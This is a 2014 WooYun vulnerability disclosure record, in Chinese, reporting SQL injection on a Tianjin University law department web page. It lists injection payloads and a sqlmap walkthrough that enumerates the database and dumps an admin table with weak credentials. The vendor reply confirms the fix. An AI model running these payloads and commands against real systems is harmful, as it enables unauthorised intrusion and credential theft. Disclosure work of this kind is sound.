{"id": 55373, "wybug_id": "wooyun-2014-061169", "wybug_title": "天津大学某分站#SQL注入", "wybug_corp": "tju.edu.cn", "wybug_author": "从容", "wybug_date": "2014-05-19 10:38", "wybug_open_date": "2014-07-03 10:38", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-03：\t细节向公众公开  简要描述： 天津大学某分站#SQL注入 详细说明：  MYSQL注入地址出现在法学系官网：\nhttp://faxuexi.tju.edu.cn/sub_teach_program.php?id=14\n\n---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=14 AND 1702=1702    Type: UNION query    Title: MySQL UNION query (NULL) - 5 columns    Payload: id=14 LIMIT 1,1 UNION ALL SELECT NULL, CONCAT(0x3a6b63693a,0x70725175747a68684a48,0x3a72766e3a), NULL, NULL, NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=14 AND SLEEP(5)---\n   漏洞证明：  #1、获取数据库：\n./sqlmap.py -u \"http://faxuexi.tju.edu.cn/sub_teach_program.php?id=14\" --dbs\n\navailable databases [2]:                                                       [*] 2012_law_tju[*] information_schema\n#2、获取表段：\n./sqlmap.py -u \"http://faxuexi.tju.edu.cn/sub_teach_program.php?id=14\" -D 2012_law_tju --tables\n\nDatabase: 2012_law_tju                                                         [15 tables]+-------------------+| active            || admin_group       || adminlog          || course            || info              || law_help          || law_intro         || link              || news              || organ_set         || party_work        || science_communion || teach_program     || teacher           || user              |+-------------------+\n#3、获取字段：\n./sqlmap.py -u \"http://faxuexi.tju.edu.cn/sub_teach_program.php?id=14\" -D 2012_law_tju -T user --columns\n\nDatabase: 2012_law_tju                                                         Table: user[8 columns]+----------+-------------+| Column   | Type        |+----------+-------------+| ID       | int(20)     || LastIP   | varchar(15) || LastTime | varchar(11) || Name     | varchar(20) || Online   | char(2)     || Order    | int(2)      || Password | varchar(25) || Power    | varchar(20) |+----------+-------------+\n#4、猜解内容：\n./sqlmap.py -u \"http://faxuexi.tju.edu.cn/sub_teach_program.php?id=14\" -D 2012_law_tju -T user -C Name,Password --dump\n\nDatabase: 2012_law_tjuTable: user[2 entries]+-------+----------+| Name  | Password |+-------+----------+| law   | law      || admin | admin    |+-------+----------+而且还是弱口令- -.\n安全测试，还有很多重要的敏感信息就不展示了- -.   修复方案：  修复 过滤 :)   版权声明：转载请注明来源 从容@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-05-23 11:59 厂商回复： 已停，通知用户整改 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}